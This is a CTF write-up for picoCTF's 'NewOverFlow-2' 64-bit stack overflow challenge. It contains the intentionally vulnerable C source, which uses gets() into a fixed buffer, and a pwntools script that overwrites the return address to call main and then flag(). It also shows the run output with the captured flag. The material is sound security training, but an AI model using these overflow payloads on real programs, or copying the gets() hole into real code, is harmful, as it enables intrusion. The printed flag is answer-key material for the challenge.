# NewOverFlow-2 - Points: 250
<b>Description : </b>Okay now lets try mainpulating arguments. program. You can find it in /problems/newoverflow-2_4_2cbec72146545064c6623c465faba84e on the shell server. Source.<br>
<b>Hints : </b>Arguments aren't stored on the stack anymore ;)
# Solved
Source
```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdbool.h>

#define BUFFSIZE 64
#define FLAGSIZE 64

bool win1 = false;
bool win2 = false;

void win_fn1(unsigned int arg_check) {
  if (arg_check == 0xDEADBEEF) {
    win1 = true;
  }
}

void win_fn2(unsigned int arg_check1, unsigned int arg_check2, unsigned int arg_check3) {
  if (win1 && \
      arg_check1 == 0xBAADCAFE && \
      arg_check2 == 0xCAFEBABE && \
      arg_check3 == 0xABADBABE) {
    win2 = true;
  }
}

void win_fn() {
  char flag[48];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);
  if (win1 && win2) {
    printf("%s", flag);
    return;
  }
  else {
    printf("Nope, not quite...\n");
  }
}

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Welcome to 64-bit. Can you match these numbers?");
  vuln();
  return 0;
}
```
This challenge is similar to the previous challenge, but here is a new function
```cpp
void win_fn1(unsigned int arg_check)
void win_fn2(unsigned int arg_check1, unsigned int arg_check2, unsigned int arg_check3)
void win_fn()
```
Meanwhile, there is function <b>flag</b> to read flag easier. So i decided using previous script solving this
```python
from pwn import *

p = process("./vuln")

# First Payload into function main execute
# 00 00 00 00 00 40 07 e8 <main>
payload = "A" * 72 + "\xce\x08\x40\x00\x00\x00\x00\x00"
p.sendlineafter("Welcome", payload)
log.info("Payload into function <main> Done")

# Last Payload into function flag to execute
# 00 00 00 00 00 40 07 67 <flag>
payload = "A" * 72 + "\x4d\x08\x40\x00\x00\x00\x00\x00"
p.sendlineafter("Welcome", payload)
log.info("Payload into function <flag> Done")

print p.recvall()
```
```
[+] Starting local process './vuln': pid 567052
[*] Payload into function <main> Done
[*] Payload into function <flag> Done
[+] Receiving all data: Done (79B)
[*] Process './vuln' stopped with exit code -11 (SIGSEGV) (pid 567052)
 to 64-bit. Can you match these numbers?
picoCTF{r0p_1t_d0nT_st0p_1t_df73a1da}
```
<b>*Edit</b>: There is some technic to solving this with <b>ROP (Return Oriented Programming)</b> https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/NewOverFlow-2.md<br>
Flag : <b>picoCTF{r0p_1t_d0nT_st0p_1t_df73a1da}</b>